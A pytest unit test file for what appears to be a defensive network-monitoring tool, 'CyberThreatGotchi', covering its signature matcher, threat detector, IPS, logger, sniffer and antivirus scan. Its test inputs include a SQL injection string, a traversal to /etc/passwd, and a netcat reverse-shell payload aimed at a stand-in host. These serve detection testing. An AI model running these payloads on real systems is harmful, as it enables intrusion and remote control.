"""Unit tests for CyberThreatGotchi."""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from config.settings import load_settings
from core.analyzer import PacketAnalyzer
from core.antivirus import AntivirusEngine
from core.detector import ThreatDetector
from core.gotchi import CyberGotchi, GotchiMood
from core.ips import IntrusionPreventionSystem
from core.sniffer import PacketSniffer, RawPacket
from db.logger import ThreatLogger, ThreatRecord
from rules.signatures import match_payload


@pytest.fixture
def settings(tmp_path):
    s = load_settings()
    s.data_dir = tmp_path
    s.db_path = tmp_path / "test.db"
    s.simulation = True
    s.ensure_dirs()
    return s


def test_signature_sql_injection():
    hits = match_payload("admin' OR 1=1--")
    assert any(h.name == "SQL Injection Probe" for h in hits)


def test_signature_traversal():
    hits = match_payload("GET /../../../etc/passwd")
    assert any("Directory Traversal" in h.name for h in hits)


def test_detector_finds_threat():
    detector = ThreatDetector()
    pkt = RawPacket(
        timestamp=1.0,
        src_ip="10.0.0.1",
        dst_ip="10.0.0.2",
        src_port=12345,
        dst_port=80,
        protocol="TCP",
        payload=b"nc -e /bin/sh evil.example 4444",
        length=30,
    )
    event = detector.inspect_packet(pkt)
    assert event is not None
    assert event.score >= 5


def test_ips_blocks_after_threshold():
    ips = IntrusionPreventionSystem(enabled=True, threshold=5)
    from core.detector import ThreatEvent

    ev = ThreatEvent(
        severity="high",
        category="test",
        source_ip="198.51.100.1",
        dest_ip="10.0.0.1",
        description="test",
        score=6,
    )
    action = ips.process_threat(ev)
    assert action in ("alert_escalated", "blocked", "logged")


def test_gotchi_levels_on_threat():
    g = CyberGotchi()
    from core.detector import ThreatEvent

    ev = ThreatEvent(
        severity="critical",
        category="malware",
        source_ip="1.2.3.4",
        dest_ip="5.6.7.8",
        description="test",
        score=15,
    )
    g.on_threat(ev, "blocked")
    assert g.state.threats_seen == 1
    assert g.state.mood == GotchiMood.ATTACK


def test_logger_persists(tmp_path):
    db = tmp_path / "t.db"
    log = ThreatLogger(db)
    rid = log.log_threat(
        ThreatRecord(
            timestamp="2025-01-01T00:00:00+00:00",
            severity="high",
            category="test",
            source_ip="1.1.1.1",
            dest_ip="2.2.2.2",
            description="unit test",
            score=8,
            action_taken="logged",
            metadata={},
        )
    )
    assert rid >= 1
    assert log.threat_count() == 1


def test_sniffer_simulation():
    sniffer = PacketSniffer(simulation=True)
    sniffer.start()
    pkt = sniffer.get_packet(timeout=3.0)
    sniffer.stop()
    assert pkt is not None
    assert pkt.src_ip


def test_analyzer_port_scan_flag():
    analyzer = PacketAnalyzer()
    pkt = RawPacket(
        timestamp=1.0,
        src_ip="10.9.9.9",
        dst_ip="10.0.0.1",
        src_port=1,
        dst_port=80,
        protocol="TCP",
        payload=b"",
        length=0,
    )
    # Simulate burst
    summary = None
    for _ in range(45):
        summary = analyzer.analyze(pkt)
    assert summary is not None
    assert "port_scan" in summary.flags


def test_av_hash_and_heuristic(tmp_path, monkeypatch):
    from config import settings as cfg

    monkeypatch.setattr(cfg, "HASH_DB_PATH", tmp_path / "hashes.txt")
    av = AntivirusEngine(hash_db_path=tmp_path / "hashes.txt")
    results = av.scan_payload(b"CTG-DEMO-MALWARE-PAYLOAD")
    assert any(r.hit for r in results)


def test_gotchi_render_sprite():
    g = CyberGotchi()
    sprite = g.render_sprite()
    assert "Cipherhorn" in sprite or "Hunger" in sprite
    assert "Cat" in sprite or "cat" in sprite.lower() or "BUS" in sprite
